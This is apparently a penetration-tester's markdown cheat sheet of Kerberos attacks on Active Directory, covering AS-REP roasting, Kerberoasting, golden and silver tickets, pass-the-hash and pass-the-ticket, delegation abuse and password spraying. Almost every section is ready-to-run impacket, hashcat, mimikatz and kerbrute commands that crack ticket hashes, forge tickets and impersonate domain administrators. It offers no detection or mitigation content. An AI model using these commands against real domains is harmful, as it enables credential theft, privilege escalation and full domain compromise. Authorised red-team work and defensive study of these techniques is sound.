# Kerberos Attacks

## 1. AS-REP Roasting
```bash
# No preauth required
impacket-GetNPUsers domain.com/user -dc-ip dc_ip -format hashcat
impacket-GetNPUsers domain.com/user:password -dc-ip dc_ip -usersfile users.txt -format hashcat
# Crack
hashcat -m 18200 hashes.txt rockyou.txt
john --wordlist=rockyou.txt hashes.txt --format=krb5asrep
```

## 2. Kerberoasting
```bash
# Request TGS for SPN
impacket-GetUserSPNs domain.com/user:password -dc-ip dc_ip -request
# Crack
hashcat -m 13100 tgs.txt rockyou.txt
john --wordlist=rockyou.txt tgs.txt --format=krb5tgs
```

## 3. Golden Ticket
```bash
# Need krbtgt NTLM hash
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.com administrator
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass domain.com/administrator@target
```

## 4. Silver Ticket
```bash
# Need service account hash
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain domain.com -spn cifs/target administrator
export KRB5CCNAME=admin.ccache
```

## 5. Overpass-the-Hash (Pass-the-Key)
```bash
# With AES key or NTLM hash
impacket-getTGT domain.com/user -hashes :ntlm_hash
impacket-getTGT domain.com/user -aesKey aes_key
export KRB5CCNAME=user.ccache
```

## 6. Pass-the-Ticket
```bash
export KRB5CCNAME=stolen.ccache
impacket-psexec -k -no-pass domain.com/administrator@target
```

## 7. Unconstrained Delegation
```bash
# Find delegation
crackmapexec ldap target -u user -p password --trusted-for-delegation
# Extract TGTs from memory
mimikatz # sekurlsa::tickets /export
```

## 8. Constrained Delegation
```bash
# Find constrained delegation
impacket-findDelegation domain.com/user:password -dc-ip dc_ip
# Exploit with S4U
impacket-getST -spn cifs/target -impersonate administrator domain.com/svc_user:password
```

## 9. RBCD (Resource-Based Constrained Delegation)
```bash
# Add computer
impacket-addcomputer domain.com/user:password -computer-name 'FAKE$' -computer-pass 'password'
# Set msDS-AllowedToActOnBehalfOfOtherIdentity
# Request ticket
impacket-getST -spn cifs/target -impersonate administrator domain.com/'FAKE$':password
```

## 10. Kerberos Brute Force
```bash
kerbrute userenum --dc dc.domain.com domain.com users.txt
kerbrute passwordspray --dc dc.domain.com domain.com users.txt password
kerbrute bruteuser --dc dc.domain.com domain.com passwords.txt user
```

## Tools
```bash
# impacket
# kerbrute
# Rubeus (Windows)
# mimikatz
```
